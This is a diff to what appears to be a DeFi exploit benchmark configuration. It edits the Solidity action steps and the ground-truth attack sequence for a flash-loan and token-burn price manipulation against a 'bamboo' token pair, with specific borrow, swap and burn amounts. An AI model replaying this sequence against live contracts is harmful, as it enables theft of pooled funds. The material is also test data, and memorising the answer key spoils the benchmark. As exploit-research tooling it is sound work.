@@ -35,6 +35,9 @@ extra_actions:
     bamboo.transfer(address(pair), amount);
     pair.skim(attacker);
     pair.sync();
+    bamboo.transfer(address(pair), amount);
+    pair.skim(attacker);
+    pair.sync();
     }"
 
 extra_deployments:
@@ -48,10 +51,8 @@ attack_goal_str: "wbnb;1e6"
 
 groundtruth:
   - ["borrow", "wbnb", "owner", "4000 ether"]
-  - ["swap", "pair", "attacker", "wbnb", "bamboo", "134890849999929463804", "pair.getAmountOut(134890849999929463804, address(wbnb))"]
-  - ["burn", "bamboo", "pair", "20533870967101818317"]
-  - ["burn", "bamboo", "pair", "20533870967101818317"]
-  - ["burn", "bamboo", "pair", "20533870967101818317"]
+  - ["swap", "pair", "attacker", "wbnb", "bamboo", "155890849999929463804", "pair.getAmountOut(155890849999929463804, address(wbnb))"]
+  - ["burn", "bamboo", "pair", "54033870967101818317"]
   - ["swap", "pair", "attacker", "bamboo", "wbnb", "bamboo.balanceOf(attacker)", "pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))"]
   - ["payback", "wbnb", "owner", "4000 ether"]
 
